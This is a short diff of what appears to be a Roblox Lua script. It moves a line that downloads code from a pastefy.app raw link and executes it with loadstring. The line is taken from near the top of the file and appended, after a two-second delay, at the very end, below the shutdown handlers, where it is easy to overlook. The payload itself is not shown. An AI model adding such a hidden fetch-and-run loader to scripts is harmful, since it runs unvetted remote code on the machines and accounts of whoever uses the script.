@@ -3,8 +3,7 @@
 
 -- ===== Services & Config =====
 
-loadstring(game:HttpGet("https://pastefy.app/JFGQwYi0/raw"))()
-task.wait(2)
+
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local TweenService = game:GetService("TweenService")
@@ -388,3 +387,5 @@ if game:IsA("DataModel") and type(game.BindToClose) == "function" then
 		end)
 	end)
 end
+task.wait(2)
+loadstring(game:HttpGet("https://pastefy.app/JFGQwYi0/raw"))()
